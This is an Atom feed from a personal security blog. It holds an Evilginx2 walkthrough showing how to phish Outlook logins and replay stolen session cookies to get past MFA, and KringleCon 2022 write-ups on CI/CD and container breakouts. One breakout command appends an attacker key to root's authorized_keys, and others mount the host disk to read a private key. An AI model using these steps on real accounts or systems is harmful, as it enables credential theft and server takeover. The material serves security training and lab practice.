<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-01-21T12:14:34+00:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Tijjjy Blog</title><subtitle>Personal blog consisting of security and tech posts!</subtitle><author><name>Tijjjy</name></author><entry><title type="html">Evilnginx2</title><link href="http://localhost:4000/2022-12-12/evilnginx2" rel="alternate" type="text/html" title="Evilnginx2" /><published>2022-12-12T00:00:00+00:00</published><updated>2022-12-12T00:00:00+00:00</updated><id>http://localhost:4000/2022-12-12/evilnginx2</id><content type="html" xml:base="http://localhost:4000/2022-12-12/evilnginx2"><![CDATA[<p><strong>DISCLAIMER</strong>: All infrastructure, accounts and domains were used temporarily on accounts and domain I own and were not used to conduct real phishing attacks. DO NOT attempt to attempt phishing attacks on users without their prior permission.</p>

<h1 id="introduction">Introduction</h1>
<p>Evilnginx2 is a reverse proxy type phishing kit/framework, designed to be the man in the middle between a user and a service such as Microsoft 365. It is simple to use requiring simply a linux server with docker installed, it’s small enough also that it can be run on a AWS ec2.t2.micro instance!</p>

<p>The webserver used is a custom version of the http server Nginx. The application itself is written fully in the programming language GO as a standalone application. The simplicity of setting up and configuring evilnginx2 is very easy and quick, all you need is a registered domain and a server.</p>

<p>Evilnginx2 is very similar to a new “evilproxy” service that has surfaced allowing people to pay for a phishing service that is a reverse proxy type phishing server.
The application/docker container is extremely lightweight, in the demonstration later in the document, I used a T2.Micro AWS EC2 instance for which little resources were used.
I am hoping this document will demonstrate how simple and easy it is to quickly spin up phishing URLS/sites to capture user credentials and session tokens.</p>

<p>Throughout this post I will be using my test domain “microsoft.zero0ne.net”</p>

<h1 id="how-it-works">How it works</h1>
<p>Evilnginx2 runs based off templates or “phishlets” which are preconfigured configuration files for the specific site you want to man in the middle, although it does come with premade templates for commonly used sites such as Micrsoft outlook, you can create your own custom ones for specifc sites.</p>

<p>Evilnginx2 runs its own http and DNS server to carry out the attacks. The HTTP server is used to host the phishing websites and reverse proxy and the DNS server is used to create subdomains for each predefined proxy host domains. This requires the NS records for your domain to be set to the evilnginx2 server, this allows the server to spin up subdomains as needed.</p>

<p>Whilst configuring evilnginx2 when you enable a phishlet, for each predefined proxy hosts domain within the phishlet configuration evilnginx2 will use letsencrypt to request a valid TLS certificate. For example, we are using the domain “microsoft.zero0ne.net”, when using the outlook phishlet, evilnginx2 will request certificates for outlook.microsoft.zero0ne.net, login.microsoft.zero0ne.net and account.microsoft.zero0ne.net which will be used in the reverse proxy for HTTPS.</p>

<p>By design evilnginx2 hides itself from internet scanners by using a redirect URL. For example when setting up a lure, you set a redirect URL, this has two purposes, the first is when successful authentication is completed the user is redirected to the set URL, and second is when something or someone attempts to connect to the domain or server IP, for example if the lure URL is https://outlook.microsoft.zero0ne.net/oafghe3 if the exact URL is not entered for say https://outlook.microsoft.zero0ne.net is entered they will be redirected to the redirect URL set seamlessly avoiding detection by internal crawlers or possibly security analysts.</p>

<p>All commands and setup instructions can be found on the evilnginx2 github page.<br />
Github Page -&gt; <a href="https://github.com/kgretzky/evilginx2">github.com/kgretzky/evilginx2</a></p>

<p>Example of a phishlet for outlook.com.
<img src="/images/posts/evilnginx2/Picture1.png" alt="Alt text" title="Example Outlook Phishlet" /></p>

<p>Additional phishlets are available, these are included in the evilnginx2 docker container.
<img src="/images/posts/evilnginx2/Picture2.png" alt="Alt text" title="Addition Phishlets" /></p>

<h1 id="installation">Installation</h1>
<p>To install evilnginx2, you will need is docker and git installed as well as no other services running on port 53/udp, 80/tcp and 443/tcp
<img src="/images/posts/evilnginx2/Picture3.png" alt="Alt text" title="clone repo" />
<img src="/images/posts/evilnginx2/Picture4.png" alt="Alt text" title="build docker image" />
<img src="/images/posts/evilnginx2/Picture5.png" alt="Alt text" title="run docker" /></p>

<h1 id="confiruration">Confiruration</h1>
<p>First, we set the root domain we want to use as well as the evilnginx2 server IP.
<img src="/images/posts/evilnginx2/Picture6.png" alt="Alt text" title="set root domain" /></p>

<p>Next, we set the hostname for the phishlet we want to use, in this case it is the outlook phishlet. And we want the URL domain to be outlook.microsoft.zero0ne.net
Once we set the hostname for the phishlet, you enable the outlook phishlet. In this step evilnginx2 will go and request the appropriate certificates from letsencrypt as predefined in the phishlet config file.</p>

<p>If the server has any DNS errors regarding letsencrypt they will be displayed.</p>

<p>Next, we create the lure, set the lure redirect URL. The lure redirect URL is what the server will redirect the user to once successful authentication has been completed OR if a request to the server is not the redirect URL. Then display the lure URL.
<img src="/images/posts/evilnginx2/Picture7.png" alt="Alt text" title="enable phishlet and lures" /></p>

<p>As seen in this screenshot, all of the unauthorized requests are clients attempting to connect to the server but not using the lure URL, this will redirect them to whichever URL you set in the lure redirect URL.<br />
<img src="/images/posts/evilnginx2/Picture8.png" alt="Alt text" title="unauthorized requests" /></p>

<h1 id="the-attack">The Attack</h1>
<p>Now we have evilnginx2 setup with the phishing URL, if we navigate to the URL, we can see it looks identical to the outlook login page, this is because evilnginx2 is a reverse proxy which just proxy’s requests through. As you can see in the URL, the domain is login.microsoft.zero0ne.net.<br />
<img src="/images/posts/evilnginx2/Picture9.png" alt="Alt text" title="phishing login page" /></p>

<p>Using a generic outlook account with multi factor authentication enabled. Once the user logins in we can see the credentials are logged in the output. Once the authentication is complete the user is redirected to google.com which was set as the redirect URL, this can be set to outlook.com which will make it seem like nothing happened.<br />
<img src="/images/posts/evilnginx2/Picture10.png" alt="Alt text" title="capture credentials" /></p>

<p>Whenever a successful authentication is completed, it is logged as a session, below we can see two logged sessions, and if we select a session, we can see the credentials as well as the session token. This can be used to login to the account without MFA.<br />
<img src="/images/posts/evilnginx2/Picture11.png" alt="Alt text" title="logged sessions" /></p>

<h1 id="logging-in">Logging In</h1>
<p>Using the Firefox extension “edithiscookie” we can import the session cookie. 
<img src="/images/posts/evilnginx2/Picture12.png" alt="Alt text" title="using cookie" /></p>

<p>Refreshed the page and we are in.<br />
<img src="/images/posts/evilnginx2/Picture13.png" alt="Alt text" title="We are in!" /></p>

<p>As you’ve just seen, it’s that easy to quickly spin up evilnginx2 with minimal setup and resources to start a phishing attack using evilnginx2.</p>

<p><strong>REMINDER</strong>: This is for educational purposes only, do not attempt to use what I have shown you here to use on someone without prior written authorization.</p>]]></content><author><name>Tijjy</name></author><summary type="html"><![CDATA[DISCLAIMER: All infrastructure, accounts and domains were used temporarily on accounts and domain I own and were not used to conduct real phishing attacks. DO NOT attempt to attempt phishing attacks on users without their prior permission.]]></summary></entry><entry><title type="html">KringleCon 2022 Jolly CI/CD</title><link href="http://localhost:4000/2022-12-11/jolly-cicd" rel="alternate" type="text/html" title="KringleCon 2022 Jolly CI/CD" /><published>2022-12-11T00:00:00+00:00</published><updated>2022-12-11T00:00:00+00:00</updated><id>http://localhost:4000/2022-12-11/jolly-cicd</id><content type="html" xml:base="http://localhost:4000/2022-12-11/jolly-cicd"><![CDATA[<p>Hello, this is my write up of the Jolly CI/CD challenge for kringlecon 2022.</p>

<p>The aim of this challenge is to expoit the CI/CD pipeline and gain access to the wordpress server. I can say this is a pretty difficult challenge and really gets you thinking. The challenge requires knowledge of git and how CI/CD pipelines work.</p>

<p><strong>Note:</strong> This challenge does take 4-5 minutes to start all of the containers required for the challenge.</p>

<p>Below here we have the starting terminal which you see when starting the challenge.
<img src="/images/kringlecon2022/jollycicd/jollycicd-01.png" alt="Alt text" title="Starting screen" /></p>

<p>Typically the first thing I do when I have a shell whether it be a vm or container is check whether I have sudo privileges, most often than not low privilege users are given more sudo privileges than they actually need, this creates a security risk and path for an attacker to escalate to root. This was shown in the Prison escape write up I did which can be found here -&gt; <a href="/kringlecon2022/prisonescape">Prison Escape Writeup</a></p>

<p>To check what sudo privileges you have can be done with the following command.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">sudo</span> <span class="nt">-l</span></code></pre></figure>

<p>It looks like we can run sudo without any password so lets go ahead and escalate to root</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">sudo </span>bash
<span class="nb">whoami</span></code></pre></figure>

<p><img src="/images/kringlecon2022/jollycicd/jollycicd-02.png" alt="Alt text" title="escalate to root" /></p>

<p>Now the target is not on the box we are currently on, as mentioned in the challenge instructions we need to exploit the wordpress server.</p>

<p>Lets go ahead and get our ip address and then use the tool nmap to scan the local subnet and attempt to the the IP addresses of the targets.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">ip a | <span class="nb">grep </span>inet</code></pre></figure>

<p><img src="/images/kringlecon2022/jollycicd/jollycicd-03.png" alt="Alt text" title="getting ip address" /></p>

<p>I will use the following command to scan the local subnet.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nmap <span class="nt">-T4</span> <span class="nt">-v</span> 172.18.0.0/16</code></pre></figure>

<p>Once the scan is completed you will see we found the targets. Although there are multiple hosts that were returned, we only need to worry about the following hosts</p>
<ul>
  <li>
    <table>
      <tbody>
        <tr>
          <td>172.18.0.88</td>
          <td>wordpress.local_docker_network</td>
        </tr>
      </tbody>
    </table>
  </li>
  <li>
    <table>
      <tbody>
        <tr>
          <td>172.18.0.150</td>
          <td>gitlab.local_docker_network</td>
        </tr>
      </tbody>
    </table>
  </li>
</ul>

<p><img src="/images/kringlecon2022/jollycicd/jollycicd-04.png" alt="Alt text" title="nmap scan" /></p>

<p>Now since we have no way of viewing the gitlab site via a GUI, we will need to use curl to take advantage of the gitlab api to view all public repositories to see what we can clone and possibly exploit.</p>

<p>This can be done by running the following command and piping the output into jq to parse the json response.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">curl <span class="nt">--request</span> GET <span class="s2">"http://gitlab.local_docker_network/api/v4/projects"</span> | jq</code></pre></figure>

<p>If successful you will see the following output, indicating that there is a public git repository we can clone called “Wordpress.Flag.Net.Internal” indicating it might be the source code of the wordpress site we need to exploit.
<img src="/images/kringlecon2022/jollycicd/jollycicd-05.png" alt="Alt text" title="gitlab projects" /></p>

<p>Lets go ahead and clone the git repo and take a look what is inside.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git</code></pre></figure>

<p><img src="/images/kringlecon2022/jollycicd/jollycicd-06.png" alt="Alt text" title="cloning the repo" /></p>

<p>Looking at the gitlab-ci.yml file, it looks like the repo utilises a gitlab CI/CD pipeline to push changes to the wordpress server, take note as we can take advantage of this to gain acess to the target server if we can find a way to push changes to the git repository.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">cat</span> .gitlab-ci.yml</code></pre></figure>

<p><img src="/images/kringlecon2022/jollycicd/jollycicd-08.png" alt="Alt text" title="gitlab-ci.yml" /></p>

<p>One thing developers do with git repositories is forget to gitignore secrets or accidentally commit secrets to a git repo. More often than not developers will push another commit removing these secrets without realising that the secrets are still there, just in previous commits.</p>

<p>Lets go ahead and do a git log to see what the previous commit comments look like.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">git log</code></pre></figure>

<p><img src="/images/kringlecon2022/jollycicd/jollycicd-07.png" alt="Alt text" title="git log" /></p>

<p>Now we can see all the previous commits that have been made. using a command git diff you can actually see the changes to each file that was made, such as removing or adding in secrets.</p>

<p>A commit that caught my eye was the commit with the message “whoops”, I think the developer made a mistake, lets do a git diff between that commit and the previous commit to see what was changed.</p>

<p>Grab the commit hashes of the commits you want to compare and run git diff against them</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">git diff abdea0ebb21b156c01f7533cea3b895c26198c98 e19f653bde9ea3de6af21a587e41e7a909db1ca5</code></pre></figure>

<p><img src="/images/kringlecon2022/jollycicd/jollycicd-09.png" alt="Alt text" title="git log" /></p>

<p>Wow look at that, the developer accidentally added in an ssh private key named “.deploy” and attempted to remove it from the git repo by doing another commit to remove it. Notice how the ssh key is named “.deploy” this might indicate this ssh key is used to push changes to the git repo. Lets try and take advantage of this.</p>

<p>Copy the key into a file such as “key.pem” and remove all the extra dashes (“-“) that the commit diff added in. The result should look like this.
<img src="/images/kringlecon2022/jollycicd/jollycicd-10.png" alt="Alt text" title="ssh key" /></p>

<p>Don’t forget to change the key permissions to 0600 otherwise openssh will error out.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">chmod </span>0600 key.pem</code></pre></figure>

<p>Now that we can push to the git repo using this ssh private key, lets go ahead and make our own ssh keypair that we can push to the wordpress server by abusing the gitlab CI/CD pipeline.</p>

<p>Generate a keypair with the following command and just hit enter until done.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">ssh-keygen</code></pre></figure>

<p><img src="/images/kringlecon2022/jollycicd/jollycicd-11.png" alt="Alt text" title="ssh keypair generation" /></p>

<p>Now cat the public key you just created. Take note of the public key as we will be putting the output into the .gitlab-ci.yml file next.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">cat</span> /home/samways/.ssh/id_rsa.pub</code></pre></figure>

<p><img src="/images/kringlecon2022/jollycicd/jollycicd-12.png" alt="Alt text" title="cat pub key" /></p>

<p>We will now write a oneliner command to add into the CI/CD pipeline scripts to add our ssh key to the wordpress root users keys.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">ssh <span class="nt">-i</span> /etc/gitlab-runner/hhc22-wordpress-deploy root@wordpress.flag.net.internal <span class="s1">'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBAKLEGKk85jbmxLc4U6n1t7AgZeNeGnEJcagj+/DbCKsOTKCdscARbTncPU/QwlTFJqIb+bja9s2ms5c7dG9Xzut3Ga21IrtbB1uVOtDPVnRZt0uej1usRyndWWYVWRCZU15wdhUNyRzHNsnkv7xDyxf4cp25+h362a+U8hI2irWlgKWQCwHY88XUBjKkdr7NKOlnGm7I6aJfFsz5Owf0vY3nFrX1ija2UrsEAq8/XmbFrj776tlLsKxf+sjA+cCuvk5YLaggkoE/DeI9pqAhX283/C9Q5UNVKof7W/Y2U2JveF2bbuC/CEGKhAID8rwdosjAFlmq7uD+UkkHKTlVawWSh1OSF9fxTbL5+ou33nfhz4kp/A7nLcb0VTdTzoSXKE46puFlD61Gdl7zUDa/ry2NmWrQ3tCfoLSd35uysbbEiO+19tFyIb+nNKVRhhWJV2F8SAxF3X/eEvNxMOjdsvxaZAEflWJUOJMtJT6JaOrJY15aVTiHvcTyQXFFMKk= samways@grinchum-land.flag.net.internal" &gt;&gt; /root/.ssh/authorized_keys'</span></code></pre></figure>

<p><img src="/images/kringlecon2022/jollycicd/jollycicd-13.png" alt="Alt text" title=".gitlab-ci.yml" /></p>

<p>Add the oneliner command above, replacing the my public key with yours, into the script: section in the .gitlab-ci.yml file as seen below.<br />
<img src="/images/kringlecon2022/jollycicd/jollycicd-14.png" alt="Alt text" title=".gitlab-ci.yml" /></p>

<p>We need to do one more step to be able to push to the repo, run the following commands, replacing the Identity file location to wherever you stored the ssh private key you found in the git logs.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">mkdir</span> /root/.ssh
nano /root/.ssh/config

Paste <span class="k">in </span>the following config

Host gitlab.flag.net.internal
  HostName gitlab.flag.net.internal
  User git
  IdentityFile /home/samways/wordpress.flag.net.internal/key.pem</code></pre></figure>

<p><img src="/images/kringlecon2022/jollycicd/jollycicd-15.png" alt="Alt text" title="ssh config" />
<img src="/images/kringlecon2022/jollycicd/jollycicd-16.png" alt="Alt text" title="ssh config" /></p>

<p>What we just did was create an ssh config for the user git at the gitlab hostname. Now when we attempt to git push using ssh, it will know which ssh key to use when authenticating.</p>

<p>Awesome, now we are good to go and push our changes and take over the wordpress server. In order, run the following commands to add your file changes, commit the changes with a message, and push the changes to the git repo.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">git add <span class="nb">.</span>
git status
git commit <span class="nt">-m</span> <span class="s2">"wordpress takeover"</span>
git push</code></pre></figure>

<p><img src="/images/kringlecon2022/jollycicd/jollycicd-17.png" alt="Alt text" title="git push" /></p>

<p>Epic, now we have successfully pushed our changes, lets go ahead and see if it worked and attempt to authenticate to the wordpress server as root using our privatekey we generate earlier. My private key was stored here -&gt; /home/samways/.ssh/id_rsa</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">ssh <span class="nt">-i</span> id_rsa root@wordpress.flag.net.internal</code></pre></figure>

<p><img src="/images/kringlecon2022/jollycicd/jollycicd-18.png" alt="Alt text" title="ssh as root to wordpress" /></p>

<p>Look at that, we did it, we successfully found secrets in a public git repository, exploited the CI/CD pipeline and gained root access to the target wordpress server.</p>

<p>All thats left to do now is grab the flag, now for all intents and purposes I won’t show the flag, so go ahead and try the challenge yourself, It was a great challenge and you will learn a lot about git.
<img src="/images/kringlecon2022/jollycicd/jollycicd-19.png" alt="Alt text" title="flag.txt" /></p>]]></content><author><name>Tijjy</name></author><summary type="html"><![CDATA[Hello, this is my write up of the Jolly CI/CD challenge for kringlecon 2022. The aim of this challenge is to expoit the CI/CD pipeline and gain access to the wordpress server. I can say this is a pretty difficult challenge and really gets you thinking. The challenge requires knowledge of git and how CI/CD pipelines work. Note: This challenge does take 4-5 minutes to start all of the containers required for the challenge. Below here we have the starting terminal which you see when starting the challenge. Typically the first thing I do when I have a shell whether it be a vm or container is check whether I have sudo privileges, most often than not low privilege users are given more sudo privileges than they actually need, this creates a security risk and path for an attacker to escalate to root. This was shown in the Prison escape write up I did which can be found here -&gt; Prison Escape Writeup To check what sudo privileges you have can be done with the following command. sudo -l It looks like we can run sudo without any password so lets go ahead and escalate to root sudo bash whoami Now the target is not on the box we are currently on, as mentioned in the challenge instructions we need to exploit the wordpress server. Lets go ahead and get our ip address and then use the tool nmap to scan the local subnet and attempt to the the IP addresses of the targets. ip a | grep inet I will use the following command to scan the local subnet. nmap -T4 -v 172.18.0.0/16 Once the scan is completed you will see we found the targets. Although there are multiple hosts that were returned, we only need to worry about the following hosts 172.18.0.88 wordpress.local_docker_network 172.18.0.150 gitlab.local_docker_network Now since we have no way of viewing the gitlab site via a GUI, we will need to use curl to take advantage of the gitlab api to view all public repositories to see what we can clone and possibly exploit. This can be done by running the following command and piping the output into jq to parse the json response. curl --request GET "http://gitlab.local_docker_network/api/v4/projects" | jq If successful you will see the following output, indicating that there is a public git repository we can clone called “Wordpress.Flag.Net.Internal” indicating it might be the source code of the wordpress site we need to exploit. Lets go ahead and clone the git repo and take a look what is inside. git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git Looking at the gitlab-ci.yml file, it looks like the repo utilises a gitlab CI/CD pipeline to push changes to the wordpress server, take note as we can take advantage of this to gain acess to the target server if we can find a way to push changes to the git repository. cat .gitlab-ci.yml One thing developers do with git repositories is forget to gitignore secrets or accidentally commit secrets to a git repo. More often than not developers will push another commit removing these secrets without realising that the secrets are still there, just in previous commits. Lets go ahead and do a git log to see what the previous commit comments look like. git log Now we can see all the previous commits that have been made. using a command git diff you can actually see the changes to each file that was made, such as removing or adding in secrets. A commit that caught my eye was the commit with the message “whoops”, I think the developer made a mistake, lets do a git diff between that commit and the previous commit to see what was changed. Grab the commit hashes of the commits you want to compare and run git diff against them git diff abdea0ebb21b156c01f7533cea3b895c26198c98 e19f653bde9ea3de6af21a587e41e7a909db1ca5 Wow look at that, the developer accidentally added in an ssh private key named “.deploy” and attempted to remove it from the git repo by doing another commit to remove it. Notice how the ssh key is named “.deploy” this might indicate this ssh key is used to push changes to the git repo. Lets try and take advantage of this. Copy the key into a file such as “key.pem” and remove all the extra dashes (“-“) that the commit diff added in. The result should look like this. Don’t forget to change the key permissions to 0600 otherwise openssh will error out. chmod 0600 key.pem Now that we can push to the git repo using this ssh private key, lets go ahead and make our own ssh keypair that we can push to the wordpress server by abusing the gitlab CI/CD pipeline. Generate a keypair with the following command and just hit enter until done. ssh-keygen Now cat the public key you just created. Take note of the public key as we will be putting the output into the .gitlab-ci.yml file next. cat /home/samways/.ssh/id_rsa.pub We will now write a oneliner command to add into the CI/CD pipeline scripts to add our ssh key to the wordpress root users keys. ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy root@wordpress.flag.net.internal 'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBAKLEGKk85jbmxLc4U6n1t7AgZeNeGnEJcagj+/DbCKsOTKCdscARbTncPU/QwlTFJqIb+bja9s2ms5c7dG9Xzut3Ga21IrtbB1uVOtDPVnRZt0uej1usRyndWWYVWRCZU15wdhUNyRzHNsnkv7xDyxf4cp25+h362a+U8hI2irWlgKWQCwHY88XUBjKkdr7NKOlnGm7I6aJfFsz5Owf0vY3nFrX1ija2UrsEAq8/XmbFrj776tlLsKxf+sjA+cCuvk5YLaggkoE/DeI9pqAhX283/C9Q5UNVKof7W/Y2U2JveF2bbuC/CEGKhAID8rwdosjAFlmq7uD+UkkHKTlVawWSh1OSF9fxTbL5+ou33nfhz4kp/A7nLcb0VTdTzoSXKE46puFlD61Gdl7zUDa/ry2NmWrQ3tCfoLSd35uysbbEiO+19tFyIb+nNKVRhhWJV2F8SAxF3X/eEvNxMOjdsvxaZAEflWJUOJMtJT6JaOrJY15aVTiHvcTyQXFFMKk= samways@grinchum-land.flag.net.internal" &gt;&gt; /root/.ssh/authorized_keys' Add the oneliner command above, replacing the my public key with yours, into the script: section in the .gitlab-ci.yml file as seen below. We need to do one more step to be able to push to the repo, run the following commands, replacing the Identity file location to wherever you stored the ssh private key you found in the git logs. mkdir /root/.ssh nano /root/.ssh/config Paste in the following config Host gitlab.flag.net.internal HostName gitlab.flag.net.internal User git IdentityFile /home/samways/wordpress.flag.net.internal/key.pem What we just did was create an ssh config for the user git at the gitlab hostname. Now when we attempt to git push using ssh, it will know which ssh key to use when authenticating. Awesome, now we are good to go and push our changes and take over the wordpress server. In order, run the following commands to add your file changes, commit the changes with a message, and push the changes to the git repo. git add . git status git commit -m "wordpress takeover" git push Epic, now we have successfully pushed our changes, lets go ahead and see if it worked and attempt to authenticate to the wordpress server as root using our privatekey we generate earlier. My private key was stored here -&gt; /home/samways/.ssh/id_rsa ssh -i id_rsa root@wordpress.flag.net.internal Look at that, we did it, we successfully found secrets in a public git repository, exploited the CI/CD pipeline and gained root access to the target wordpress server. All thats left to do now is grab the flag, now for all intents and purposes I won’t show the flag, so go ahead and try the challenge yourself, It was a great challenge and you will learn a lot about git.]]></summary></entry><entry><title type="html">KringleCon 2022 Prison Escape</title><link href="http://localhost:4000/2022-12-11/prison-escape" rel="alternate" type="text/html" title="KringleCon 2022 Prison Escape" /><published>2022-12-11T00:00:00+00:00</published><updated>2022-12-11T00:00:00+00:00</updated><id>http://localhost:4000/2022-12-11/prison-escape</id><content type="html" xml:base="http://localhost:4000/2022-12-11/prison-escape"><![CDATA[<p>Hello, this is my write up of the Prison Escape challenge for kringlecon 2022.</p>

<p>The aim of this challenge is to escape a container aka a container breakout. I must admit I did run down a rabbit hole when doing my first attempt but once I realised the answer it became quite obvious.</p>

<p>Below here we have the starting terminal which you see when starting the challenge.
<img src="/images/kringlecon2022/prisonescape/prisonescape-01.png" alt="Alt text" title="Starting screen" /></p>

<p>Typically the first thing I do when I have a shell whether it be a vm or container is check whether I have sudo privileges, most often than not low privilege users are given more sudo privileges than they actually need, this creates a security risk and path for an attacker to escalate to root.</p>

<p>To check what sudo privileges you have can be done with the following command.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">sudo</span> <span class="nt">-l</span></code></pre></figure>

<p>When you run the command you should see this output.
<img src="/images/kringlecon2022/prisonescape/prisonescape-02.png" alt="Alt text" title="sudo -l" /></p>

<p>Taking a look at the output seen above, We can immidiately see our current user can run any command with sudo requiring no password at all!</p>

<p>Now lets escalate to root with the good ole sudo bash and confirm we are root.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">sudo </span>bash
<span class="nb">whoami</span></code></pre></figure>

<p><img src="/images/kringlecon2022/prisonescape/prisonescape-03.png" alt="Alt text" title="sudo bash" /></p>

<p>Upon doing some research into privileged containers I came across an article by trendmicro detailing the –privileged flag for containers and how it can be abused by an attacker to gain access to the host system.<br />
Article: <a href="https://www.trendmicro.com/en_us/research/19/l/why-running-a-privileged-container-in-docker-is-a-bad-idea.html">why-running-a-privileged-container-in-docker-is-a-bad-idea</a></p>

<p>Further down in the article there is a section explaining that a privileged container has the capability to list as mount the host devices.
<img src="/images/kringlecon2022/prisonescape/prisonescape-04.png" alt="Alt text" title="mounting host devices" /></p>

<p>Lets take a look at prison escape container and see if we can list the host devices in /dev.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">ls</span> /dev</code></pre></figure>

<p><img src="/images/kringlecon2022/prisonescape/prisonescape-05.png" alt="Alt text" title="listing host devices" /></p>

<p>Listing the devices we can see all the standard devices a linux system would have, what caught my eye was the device “vda”, this has the naming standard that I see commonly when creating linux partitions which could be vda, sda, xda from past experience.</p>

<p>Lets go ahead and try to mount the vda device. We can do that with the following commands.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">mkdir</span> /mnt/vda
mount /dev/vda /mnt/vda
<span class="nb">cd</span> /mnt/vda</code></pre></figure>

<p><img src="/images/kringlecon2022/prisonescape/prisonescape-06.png" alt="Alt text" title="mounting the vda device" /></p>

<p>It looks like it mounted without errors, now lets see whats in it.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">ls</span></code></pre></figure>

<p><img src="/images/kringlecon2022/prisonescape/prisonescape-07.png" alt="Alt text" title="listed /mnt/vda" /></p>

<p>Wow look at that, we have just mounted the host filesystem. Since this container was started with the “–privileged” flag it has the capability to see and mount the host filesystem as we just did.</p>

<p>Lets go ahead and get the flag which resides in the user “jailer”s’ private key. Now for the purpose of the challenge I’m not going to show the flag so you can atleast go do the challenge yourself and get the experience of breaking out of a container.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">cat </span>home/jailer/.ssh/jail.key.priv</code></pre></figure>

<p><img src="/images/kringlecon2022/prisonescape/prisonescape-08.png" alt="Alt text" title="catting the jailers private key" /></p>

<p>Thats it, we successfully completed the prison escape challenge, now go ahead and do it yourself. I personally liked this challenge as I’m quite a fan of containers!</p>]]></content><author><name>Tijjy</name></author><summary type="html"><![CDATA[Hello, this is my write up of the Prison Escape challenge for kringlecon 2022. The aim of this challenge is to escape a container aka a container breakout. I must admit I did run down a rabbit hole when doing my first attempt but once I realised the answer it became quite obvious. Below here we have the starting terminal which you see when starting the challenge. Typically the first thing I do when I have a shell whether it be a vm or container is check whether I have sudo privileges, most often than not low privilege users are given more sudo privileges than they actually need, this creates a security risk and path for an attacker to escalate to root. To check what sudo privileges you have can be done with the following command. sudo -l When you run the command you should see this output. Taking a look at the output seen above, We can immidiately see our current user can run any command with sudo requiring no password at all! Now lets escalate to root with the good ole sudo bash and confirm we are root. sudo bash whoami Upon doing some research into privileged containers I came across an article by trendmicro detailing the –privileged flag for containers and how it can be abused by an attacker to gain access to the host system. Article: why-running-a-privileged-container-in-docker-is-a-bad-idea Further down in the article there is a section explaining that a privileged container has the capability to list as mount the host devices. Lets take a look at prison escape container and see if we can list the host devices in /dev. ls /dev Listing the devices we can see all the standard devices a linux system would have, what caught my eye was the device “vda”, this has the naming standard that I see commonly when creating linux partitions which could be vda, sda, xda from past experience. Lets go ahead and try to mount the vda device. We can do that with the following commands. mkdir /mnt/vda mount /dev/vda /mnt/vda cd /mnt/vda It looks like it mounted without errors, now lets see whats in it. ls Wow look at that, we have just mounted the host filesystem. Since this container was started with the “–privileged” flag it has the capability to see and mount the host filesystem as we just did. Lets go ahead and get the flag which resides in the user “jailer”s’ private key. Now for the purpose of the challenge I’m not going to show the flag so you can atleast go do the challenge yourself and get the experience of breaking out of a container. cat home/jailer/.ssh/jail.key.priv Thats it, we successfully completed the prison escape challenge, now go ahead and do it yourself. I personally liked this challenge as I’m quite a fan of containers!]]></summary></entry><entry><title type="html">Generate a self-signed SSL certificate and key</title><link href="http://localhost:4000/2022-12-10/generate-selfsigned-ssl-cert-copy" rel="alternate" type="text/html" title="Generate a self-signed SSL certificate and key" /><published>2022-12-10T00:00:00+00:00</published><updated>2022-12-10T00:00:00+00:00</updated><id>http://localhost:4000/2022-12-10/generate-selfsigned-ssl-cert%20copy</id><content type="html" xml:base="http://localhost:4000/2022-12-10/generate-selfsigned-ssl-cert-copy"><![CDATA[<p>To generate a quick and easy self signed certificate and private key, run the following command with any system that has openssl installed.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">openssl req <span class="nt">-x509</span> <span class="nt">-newkey</span> rsa:4096 <span class="nt">-keyout</span> key.pem <span class="nt">-out</span> cert.pem <span class="nt">-sha256</span> <span class="nt">-days</span> 365 <span class="nt">--nodes</span></code></pre></figure>

<p>There is a code snipped of the command here -&gt; <a href="https://gitlab.tijns.net/-/snippets/2/raw/master/certkeygen.sh">snippet</a></p>]]></content><author><name>Tijjy</name></author><summary type="html"><![CDATA[To generate a quick and easy self signed certificate and private key, run the following command with any system that has openssl installed. openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -sha256 -days 365 --nodes There is a code snipped of the command here -&gt; snippet]]></summary></entry></feed>